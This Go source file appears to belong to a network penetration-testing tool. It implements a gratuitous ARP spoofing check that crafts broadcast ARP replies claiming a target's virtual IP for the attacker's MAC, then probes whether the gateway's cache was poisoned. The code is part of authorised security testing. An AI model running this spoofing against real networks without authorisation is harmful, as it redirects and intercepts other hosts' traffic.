// gratarp.go implements the gratuitous ARP check. Impact temporary,
// restore decay with no stated bound, affects clients: the broadcast ARP
// replies announce the virtual address at the attack leg's MAC, and the
// hosts' neighbor caches age the entry out on their own timers.

package fh

import (
	"context"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
)

type gratARPFinding struct {
	Action string `json:"action"`
	IP     string `json:"ip"`
	Count  int    `json:"count"`
}

// RunGratARP sends gratuitous ARP replies announcing the attacker's MAC
// for the target's virtual IP, the address the attacker claims, then
// probes the gateway's cache with an ICMP echo request sent to the
// gateway's MAC from the virtual IP. The burst of three is probe content.
// The predicate is the reply's Ethernet destination: the gateway's echo
// reply addressed to the attack leg's MAC confirms, a reply to another MAC
// or an ARP request from the gateway for the virtual IP resists, and
// silence within the window is pending.
func RunGratARP(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVirtualIP, check.FieldGateway, check.FieldGatewayMAC); err != nil {
		return check.Verdict{}, err
	}
	src := deps.AttackLeg.Addr().MAC
	ip := deps.Target.VirtualIP

	count := 3
	for i := range count {
		pkt, err := craftGratARP(src, ip)
		if err != nil {
			return check.Verdict{}, errs.Wrapf(err, "gratarp: craft frame %d", i)
		}
		if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
			return check.Verdict{}, errs.Wrapf(err, "gratarp: send frame %d", i)
		}
	}

	detail, _ := json.Marshal(gratARPFinding{
		Action: "gratuitous-arp",
		IP:     ip.String(),
		Count:  count,
	})
	deps.Emitter.Finding("arp", detail)

	v, err := observeCacheProbe(ctx, deps, cacheProbe{
		peer:     deps.Target.Gateway,
		peerName: "gateway",
		spoofed:  ip,
	}, fmt.Sprintf("the gateway sent its traffic for %s to the attack leg", ip))
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "gratarp")
	}
	return v, nil
}

// craftGratARP builds a gratuitous ARP reply: announcing ip is-at src.
func craftGratARP(src net.HardwareAddr, ip net.IP) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       broadcastMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := &layers.ARP{
		AddrType:          1,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         2, // reply
		SourceHwAddress:   src,
		SourceProtAddress: ip,
		DstHwAddress:      broadcastMAC,
		DstProtAddress:    ip,
	}
	return craft.Default(eth, arp)
}
